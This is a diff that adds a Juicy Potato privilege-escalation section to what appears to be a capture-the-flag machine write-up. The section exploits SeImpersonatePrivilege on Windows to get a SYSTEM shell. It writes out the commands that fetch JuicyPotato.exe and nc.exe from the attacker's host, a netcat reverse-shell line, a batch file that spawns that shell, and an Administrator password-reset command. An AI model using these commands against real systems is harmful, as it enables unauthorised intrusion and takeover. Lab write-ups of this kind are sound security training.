@@ -312,7 +312,53 @@ The process should hang, but that doesn’t matter, because if we switch tabs to
 That concludes this particular method for privilege escalation on this box, although discovering the vulnerability for this privilege escalation path can be a little tedious if you don’t have the correct tools, and even then those tools need to be compiled in a local windows environment. This privilege escalation route shows that it is helpful to enumerate system info to determine how unlatched the target system is.
 
 ### Juicy Potato
-In progress...
+When enumerating windows systems for privilege escalation vulnerabilities it’s good to check the privileges information using ``whoami /priv``, the output of this command will show what privileges the current user has enabled or disabled.
+
+![img](assets/priv.png)
+
+When we analyse the output, we can see that privilege name ‘SeInpersonatePrivilege’ is enabled, this means the current user has the permission to impersonate other client processes which have the same privilege level as the user. This is done based on the Class ID (CLSID) of the users process object being used to determine the permissions of any client processes. The issue with this setting is that if a client process was impersonated by using a NT AUTHORITY\SYSTEM process object CLSID rather than their own process CLSID, it would allow those client processes to be run at SYSTEM privilege level. 
+
+We can use a helpful tool called Juicy Potato to take advantage of this, it is a compiled windows executable that can use the current users ‘SeImpersonatePrivilege’ status to create client processes that impersonate SYSTEM level permissions. It does this by creating a new process with a specified path to the program to run, however it allows us to provide the CLSID token ourselves. Without going into too much detail of this executables functionality, it can create client processes with NT AUTHORITY\SYSTEM CLSID tokens so that the impersonating client process running the program will impersonate SYSTEM level permissions. This means we can run scripts with full SYSTEM privilege. We can find Juicy Potato, information about it as-well as a helpful list of ClSID’s that we can use on their github https://github.com/ohpe/juicy-potato.
+
+To use Juicy Potato we need to download it from the GitHub release either by following this link https://github.com/ohpe/juicy-potato/releases or by using ``wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe``. Once we have a copy on your local machine we can then download it into the target system using our python server. 
+
+![img](assets/clone_and_host.png)
+
+The Juicy Potato executable is now being hosted on the python server. Downloading it onto the target with our reverse TCP power-shell terminal requires a different command to the one we used with our ASP shell. Instead of downloading the script as a string to be executed by the ``invoke-expression`` command, we can use the PowerShell command ``Invoke-WebRequest`` instead to simply download the file and save a copy as the output file. With the JuicyPotato.exe being hosted by our python server the command to download it should simply be  ``Invoke-WebRequest -URI http://[your IP]/JuicyPotato.exe -OutFile JuicyPotato.exe`` in our PowerShell terminal.
+
+![img](assets/download_potato.png)
+
+Juicy Potato works best in a Command Prompt (CMD) shell rather than PowerShell, thankfully we can install Netcat on the target machine. First clone a copy of ``nc.exe`` to our machine from github with ``wget https://github.com/int0x33/nc.exe/raw/master/nc.exe``, then we host it with our python server and download it the exact same way as we did with Juicy Potato. The command to spawn a CMD reverse shell with Netcat using PowerShell is ``.\nc.exe -e cmd.exe  [your IP] [port]``. 
+
+![img](assets/nc.png)
+
+Provided a different port was used and we have a listener running, we should now have a terminal connection with Command Prompt rather than PowerShell.
+
+![img](assets/nc_shell.png)
+
+Now we need to create a program for the client process to run, since the execution of batch script files (.bat) counts as a program we can use that. By using Juicy Potato, the process running this batch script can do so by impersonating SYSTEM level privileges. This means we could create a single line batch file such as ``net user Administrator abc123!`` that changes the Administrator user password, allowing us to gain direct remote access using tools such as psexec.py, we could even repeat the command we used with our ASP shell to spawn a different PowerShell script on a different port. Another possible alternative to using shells is to write a batch script that will type the system flag into a file we can access via our user level shell too. 
+
+However since we went ahead and put Netcat on the target we can use ``echo C:\Users\Destitute\nc.exe -e cmd.exe [your IP] [port] > shell.bat`` to create a single lined batch script which creates a reverse TCP shell. It is important to include the full path of ``nc.exe`` and to use a different port number. When we run this batch script with Juicy Potato it should give us a SYSTEM shell, provided we use a valid CLSID for an NT AUTHORITY\SYSTEM process object.
+
+![img](assets/bat.png) 
+
+A Class Identifier (CLSID) is a string of alphanumeric symbols that are used to represent specific instances of objects from the Component Object Model (COM). It is essentially the registry identifier for that particular class which the process object is instantiated from. Since we want to run our batch file with SYSTEM privileges we are going to need Juicy Potato to create the impersonating client process with NT AUTHORITY/SYSTEM CLSID’s. By doing so the process executing the batch script will impersonate and thus execute it with SYSTEM level permissions.
+
+Before we know what CLSID we need to use, we are going to need to enumerate the system OS and find out what version and build of windows is being used. We can do this on the target simply with the command ``systeminfo``.
+
+![img](assets/CLSID_check.png)
+
+From this we can see that Windows 10 Enterprise edition is being used, thankfully a full list of working CLSID’s has been compiled and is available on the Juicy Potato GitHub at https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise. Since we are trying to privilege escalate we want to be trying the CLSID’s of local services that are run by the NT AUTHORITY\SYSTEM user.
+
+To run Juicy Potato we need to set the correct parameters, ``-t`` determines which type of ‘createprocess’ call to make, by using ``*`` we are telling it to try both,  ``-p`` references the program being run by this process we are creating, in this case that will be our batch script, ``-l`` sets the listener port for the Component Object Model and is conventionally set to ``9001``. Finally we can specify our CLSID with the ``-c`` parameter. Therefore the full command to run and test it in our case will be ``JuicyPotato.exe -t * -p C:\Users\Destitute\shell.bat -l 9001 -c [CLSID]`` If it doesn’t work first time, you may need to try different NT AUTHORITY\SYSTEM CLSID’s until one of them works.
+
+![img](assets/juicypotato.png)
+
+Once we find a CLSID that successfully works, we will have our batch script (.bat file) executed at the SYSTEM privilege level, therefore if we go back to our listener we should see that we now have a reverse TCP shell connection with NT AUTHORITY\SYSTEM.
+
+![img](assets/root2.png)
+
+With this shell we are able to access our system flag and complete the machine. [REMOVE THIS WHEN DONE]
 
 ## Conclusion
 In this machine we learned about the IKE protocol and how to use IPsec in order to subvert firewall restrictions for TCP connections. Then through vulnerable FTP anonymous user that uploads to a web service we are able to upload an ASP web shell and get basic command execution. Using this web shell we can upload a PowerShell script that gives us a user shell. Finally there are two routes that can be taken for privilege escalation, one by making use of a Common Vulnerabilities and Exposures (CVE) entry, the other by using Juicy Potato to exploit the user having SeImpersonatePrivilege enabled. Overall a very interesting box which requires an entire technique just to scan TCP ports, a long but rewarding challenge with a fairly realistic scenario.
